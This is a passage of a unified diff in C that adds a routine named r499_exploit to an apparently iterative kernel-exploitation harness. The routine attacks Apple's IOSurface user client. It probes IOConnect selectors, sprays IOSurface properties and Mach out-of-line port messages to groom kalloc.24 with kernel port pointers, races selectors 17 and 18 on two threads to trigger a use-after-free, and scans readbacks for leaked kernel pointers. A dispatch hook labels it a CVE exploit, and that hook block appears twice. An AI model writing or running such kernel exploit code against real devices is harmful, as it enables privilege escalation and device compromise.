+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(nw); CFRelease(nh);
+    CFRelease(nb); CFRelease(na); CFRelease(nf);
+
+    if (!surf) { rlog("  IOSurfaceCreate failed\n"); IOServiceClose(conn); IOObjectRelease(svc); goto r499_done; }
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Surface: id=%u\n", sid);
+
+    /* Phase 2: Probe selector 17 calling conventions */
+    rlog("\n--- Phase 2: Selector 17/18 calling convention probe ---\n");
+
+    /* Create notification port */
+    mach_port_t notify_port = MACH_PORT_NULL;
+    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify_port);
+    rlog("  Notify port: 0x%x (kr=%d)\n", notify_port, kr);
+    if (kr != 0) goto r499_cleanup;
+
+    mach_port_insert_right(mach_task_self(), notify_port, notify_port, MACH_MSG_TYPE_MAKE_SEND);
+
+    /* Try IOConnectCallAsyncMethod for selector 17 */
+    {
+        uint64_t reference[8] = {0};
+        uint32_t referenceCnt = 1;
+
+        /* Variant A: 1 scalar (surface ID), async with port */
+        uint64_t scalar_a[2] = {sid, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+            reference, referenceCnt,
+            scalar_a, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 async(1 scalar, sid=%u): kr=%d (0x%x)\n", sid, kr, kr);
+
+        /* Variant B: 0 scalars, struct = surface ID as uint32 */
+        uint32_t struct_b = sid;
+        kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+            reference, referenceCnt,
+            NULL, 0, &struct_b, sizeof(struct_b),
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 async(0 scalar, 4b struct): kr=%d (0x%x)\n", kr, kr);
+
+        /* Variant C: 2 scalars (sid, 0) */
+        uint64_t scalar_c[2] = {sid, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+            reference, referenceCnt,
+            scalar_c, 2, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 async(2 scalar): kr=%d (0x%x)\n", kr, kr);
+
+        /* Variant D: sync call, 1 scalar */
+        kr = IOConnectCallMethod(conn, 17,
+            scalar_a, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 sync(1 scalar): kr=%d (0x%x)\n", kr, kr);
+
+        /* Variant E: sync call, 0 scalar, struct = sid */
+        kr = IOConnectCallMethod(conn, 17,
+            NULL, 0, &struct_b, sizeof(struct_b),
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 sync(0 scalar, 4b struct): kr=%d (0x%x)\n", kr, kr);
+
+        /* Variant F: async with 3-uint64 struct (sid, type, flags) */
+        uint64_t struct_f[3] = {sid, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+            reference, referenceCnt,
+            NULL, 0, struct_f, sizeof(struct_f),
+            NULL, NULL, NULL, NULL);
+        rlog("  sel17 async(0 scalar, 24b struct): kr=%d (0x%x)\n", kr, kr);
+
+        /* Try selector 18 too */
+        kr = IOConnectCallMethod(conn, 18,
+            scalar_a, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        rlog("  sel18 sync(1 scalar): kr=%d (0x%x)\n", kr, kr);
+
+        kr = IOConnectCallAsyncMethod(conn, 18, notify_port,
+            reference, referenceCnt,
+            scalar_a, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        rlog("  sel18 async(1 scalar): kr=%d (0x%x)\n", kr, kr);
+
+        /* Try wider selector range for notify-related methods */
+        rlog("\n  Scanning selectors 15-25 (async, 1 scalar=sid):\n");
+        for (int sel = 15; sel <= 25; sel++) {
+            kr = IOConnectCallAsyncMethod(conn, sel, notify_port,
+                reference, referenceCnt,
+                scalar_a, 1, NULL, 0,
+                NULL, NULL, NULL, NULL);
+            rlog("    sel%d async(1s): kr=%d (0x%x)\n", sel, kr, kr);
+        }
+
+        rlog("\n  Scanning selectors 15-25 (sync, 1 scalar=sid):\n");
+        for (int sel = 15; sel <= 25; sel++) {
+            kr = IOConnectCallMethod(conn, sel,
+                scalar_a, 1, NULL, 0,
+                NULL, NULL, NULL, NULL);
+            rlog("    sel%d sync(1s): kr=%d (0x%x)\n", sel, kr, kr);
+        }
+
+        /* Try selectors 0-10 with async (some may be property-related) */
+        rlog("\n  Scanning selectors 0-14 (async, 1 scalar=sid):\n");
+        for (int sel = 0; sel <= 14; sel++) {
+            kr = IOConnectCallAsyncMethod(conn, sel, notify_port,
+                reference, referenceCnt,
+                scalar_a, 1, NULL, 0,
+                NULL, NULL, NULL, NULL);
+            rlog("    sel%d async(1s): kr=%d (0x%x)\n", sel, kr, kr);
+        }
+    }
+
+    /* Phase 3: IOSurface property spray for kalloc.24 zone filling */
+    rlog("\n--- Phase 3: Property spray sizes ---\n");
+    {
+        /* Spray properties of various sizes to identify which hit kalloc.24 */
+        /* kalloc.24 means 24-byte allocations */
+        char key[64];
+        for (int sz = 8; sz <= 64; sz += 4) {
+            snprintf(key, sizeof(key), "spray_%d", sz);
+            CFMutableDataRef data = CFDataCreateMutable(NULL, 0);
+            for (int i = 0; i < sz; i++) {
+                uint8_t b = (uint8_t)(i ^ 0xAA);
+                CFDataAppendBytes(data, &b, 1);
+            }
+            IOSurfaceSetValue(surf, CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), data);
+            CFRelease(data);
+        }
+
+        /* Read them back to confirm */
+        int confirmed = 0;
+        for (int sz = 8; sz <= 64; sz += 4) {
+            snprintf(key, sizeof(key), "spray_%d", sz);
+            CFTypeRef val = IOSurfaceCopyValue(surf, CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII));
+            if (val) {
+                confirmed++;
+                CFRelease(val);
+            }
+        }
+        rlog("  Property spray: set 15 sizes, confirmed %d readback\n", confirmed);
+    }
+
+    /* Phase 4: Mach port OOL spray into kalloc zones */
+    rlog("\n--- Phase 4: Mach port OOL spray for kptr embedding ---\n");
+    {
+        #define N_SPRAY_PORTS 256
+        mach_port_t spray_ports[N_SPRAY_PORTS];
+        int created = 0;
+        for (int i = 0; i < N_SPRAY_PORTS; i++) {
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+            if (kr == 0) {
+                mach_port_insert_right(mach_task_self(), spray_ports[i], spray_ports[i],
+                    MACH_MSG_TYPE_MAKE_SEND);
+                created++;
+            }
+        }
+        rlog("  Created %d spray ports\n", created);
+
+        /* Send OOL port descriptors via mach messages */
+        /* Each OOL port array creates a kalloc allocation in the kernel containing
+           pointers to the ports' kernel objects (ipc_port_t) */
+        #define N_OOL_MSGS 64
+        #define OOL_PORTS_PER_MSG 3   /* 3 ports * 8 bytes = 24 bytes -> kalloc.24 */
+        mach_port_t ool_holding[N_OOL_MSGS];
+        int sent = 0;
+        for (int i = 0; i < N_OOL_MSGS; i++) {
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_holding[i]);
+            if (kr != 0) continue;
+
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_ports_descriptor_t ool;
+            } msg = {0};
+
+            mach_port_t ool_ports[OOL_PORTS_PER_MSG];
+            for (int j = 0; j < OOL_PORTS_PER_MSG; j++)
+                ool_ports[j] = spray_ports[i % created];
+
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = ool_holding[i];
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = ool_ports;
+            msg.ool.count = OOL_PORTS_PER_MSG;
+            msg.ool.deallocate = 0;
+            msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+            msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+            kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
+                MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            if (kr == 0) sent++;
+        }
+        rlog("  Sent %d OOL port msgs (3 ports each = 24 bytes = kalloc.24)\n", sent);
+
+        /* Phase 5: If sel 17 works, attempt race */
+        rlog("\n--- Phase 5: Race attempt (if sel 17 accepted) ---\n");
+        {
+            /* First test a single insert/remove cycle */
+            uint64_t reference[8] = {0};
+            uint32_t referenceCnt = 1;
+            uint64_t scalar[2] = {sid, 0};
+
+            kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+                reference, referenceCnt,
+                scalar, 1, NULL, 0,
+                NULL, NULL, NULL, NULL);
+            rlog("  Single insert: kr=%d\n", kr);
+
+            if (kr == 0) {
+                /* Insert succeeded! Now remove */
+                kr = IOConnectCallMethod(conn, 18,
+                    scalar, 1, NULL, 0,
+                    NULL, NULL, NULL, NULL);
+                rlog("  Single remove: kr=%d\n", kr);
+
+                /* Now race! */
+                rlog("  Starting race threads...\n");
+
+                struct race_ctx ctx = {
+                    .conn = conn,
+                    .surface_id = sid,
+                    .notify_port = notify_port,
+                    .go = 0,
+                    .stop = 0,
+                    .insert_count = 0,
+                    .remove_count = 0,
+                    .insert_errs = 0,
+                    .remove_errs = 0
+                };
+
+                pthread_t t_insert, t_remove;
+                pthread_create(&t_insert, NULL, race_insert_thread, &ctx);
+                pthread_create(&t_remove, NULL, race_remove_thread, &ctx);
+
+                ctx.go = 1;
+                usleep(50000); /* Race for 50ms */
+                ctx.stop = 1;
+
+                pthread_join(t_insert, NULL);
+                pthread_join(t_remove, NULL);
+
+                rlog("  Race result: ins=%d(err=%d) rem=%d(err=%d)\n",
+                     ctx.insert_count, ctx.insert_errs,
+                     ctx.remove_count, ctx.remove_errs);
+
+                /* Check for stale entry by reading properties */
+                rlog("  Checking surface properties after race:\n");
+                CFDictionaryRef allProps = IOSurfaceCopyAllValues(surf);
+                if (allProps) {
+                    CFIndex cnt = CFDictionaryGetCount(allProps);
+                    rlog("    Property count: %ld\n", (long)cnt);
+                    CFRelease(allProps);
+                }
+            } else {
+                rlog("  sel17 not accepted, trying alternate approaches...\n");
+
+                /* Try with struct input instead */
+                uint32_t struct_in = sid;
+                kr = IOConnectCallAsyncMethod(conn, 17, notify_port,
+                    reference, referenceCnt,
+                    NULL, 0, &struct_in, sizeof(struct_in),
+                    NULL, NULL, NULL, NULL);
+                rlog("  sel17 async(struct=sid): kr=%d\n", kr);
+
+                /* Try IOConnectCallAsyncStructMethod */
+                kr = IOConnectCallAsyncStructMethod(conn, 17, notify_port,
+                    reference, referenceCnt,
+                    &struct_in, sizeof(struct_in),
+                    NULL, NULL);
+                rlog("  sel17 AsyncStructMethod(4b): kr=%d\n", kr);
+
+                /* Try different connection types */
+                for (int ctype = 1; ctype <= 4; ctype++) {
+                    io_connect_t conn2 = 0;
+                    kr = IOServiceOpen(svc, mach_task_self(), ctype, &conn2);
+                    rlog("  IOServiceOpen(type=%d): kr=%d conn=0x%x\n", ctype, kr, conn2);
+                    if (kr == 0 && conn2) {
+                        kr = IOConnectCallAsyncMethod(conn2, 17, notify_port,
+                            reference, referenceCnt,
+                            scalar, 1, NULL, 0,
+                            NULL, NULL, NULL, NULL);
+                        rlog("    sel17 async: kr=%d\n", kr);
+                        IOServiceClose(conn2);
+                    }
+                }
+            }
+        }
+
+        /* Phase 6: Try alternate UAF path - IOSurface property type confusion */
+        rlog("\n--- Phase 6: Property type confusion probe ---\n");
+        {
+            /* Set a property as one type, try to read as another */
+            int32_t intval = 0x41424344;
+            CFNumberRef num = CFNumberCreate(NULL, kCFNumberSInt32Type, &intval);
+            IOSurfaceSetValue(surf, CFSTR("confuse_test"), num);
+            CFRelease(num);
+
+            CFTypeRef readback = IOSurfaceCopyValue(surf, CFSTR("confuse_test"));
+            if (readback) {
+                CFTypeID tid = CFGetTypeID(readback);
+                rlog("  Set int, read type=%lu (%s)\n", tid,
+                     tid == CFNumberGetTypeID() ? "CFNumber" :
+                     tid == CFDataGetTypeID() ? "CFData" :
+                     tid == CFStringGetTypeID() ? "CFString" : "other");
+                if (tid == CFNumberGetTypeID()) {
+                    int64_t v = 0;
+                    CFNumberGetValue((CFNumberRef)readback, kCFNumberSInt64Type, &v);
+                    rlog("  Value: 0x%llx\n", (unsigned long long)v);
+                }
+                CFRelease(readback);
+            }
+
+            /* Set large data, check if any kernel pointers leak through */
+            uint8_t bigdata[256];
+            memset(bigdata, 0, sizeof(bigdata));
+            CFDataRef bigd = CFDataCreate(NULL, bigdata, sizeof(bigdata));
+            IOSurfaceSetValue(surf, CFSTR("big_probe"), bigd);
+            CFRelease(bigd);
+
+            CFTypeRef bigread = IOSurfaceCopyValue(surf, CFSTR("big_probe"));
+            if (bigread && CFGetTypeID(bigread) == CFDataGetTypeID()) {
+                const uint8_t *bytes = CFDataGetBytePtr((CFDataRef)bigread);
+                CFIndex len = CFDataGetLength((CFDataRef)bigread);
+                rlog("  Big readback: %ld bytes\n", (long)len);
+                int nonzero = 0;
+                for (CFIndex i = 0; i < len; i++) {
+                    if (bytes[i] != 0) nonzero++;
+                }
+                if (nonzero > 0) {
+                    rlog("  NONZERO bytes found: %d\n", nonzero);
+                    for (CFIndex i = 0; i + 7 < len; i += 8) {
+                        uint64_t qw = *(uint64_t*)(bytes + i);
+                        if (qw != 0) {
+                            rlog("    +%ld: 0x%016llx", (long)i, (unsigned long long)qw);
+                            if ((qw & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                rlog(" *** KPTR ***");
+                            rlog("\n");
+                        }
+                    }
+                } else {
+                    rlog("  All zeros (clean roundtrip)\n");
+                }
+                CFRelease(bigread);
+            }
+        }
+
+        /* Cleanup OOL ports */
+        for (int i = 0; i < N_OOL_MSGS; i++) {
+            if (ool_holding[i]) mach_port_destroy(mach_task_self(), ool_holding[i]);
+        }
+        for (int i = 0; i < N_SPRAY_PORTS; i++) {
+            if (spray_ports[i]) mach_port_destroy(mach_task_self(), spray_ports[i]);
+        }
+        #undef N_SPRAY_PORTS
+        #undef N_OOL_MSGS
+        #undef OOL_PORTS_PER_MSG
+    }
+
+r499_cleanup:
+    if (notify_port != MACH_PORT_NULL)
+        mach_port_destroy(mach_task_self(), notify_port);
+    if (surf) CFRelease(surf);
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+
+r499_done:
+    rlog("\n=== r499 complete ===\n");
     fflush(stdout);
 }
 
@@ -97200,6 +98316,18 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 503) {
+            rlog("*** rounds=503: CVE-2026-112477 IOSurface sel 17/18 race ***\n\n");
+            fflush(stdout);
+            r499_exploit();
+            goto done;
+        }
+        if (rounds == 503) {
+            rlog("*** rounds=503: IOSurface sel17/18 async race + kptr leak ***\n\n");
+            fflush(stdout);
+            r499_exploit();
+            goto done;
+        }
         if (rounds == 502) {
             rlog("*** rounds=502: Bitstream comparison + PropertyMode ***\n\n");
             fflush(stdout);
@@ -100221,7 +101349,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
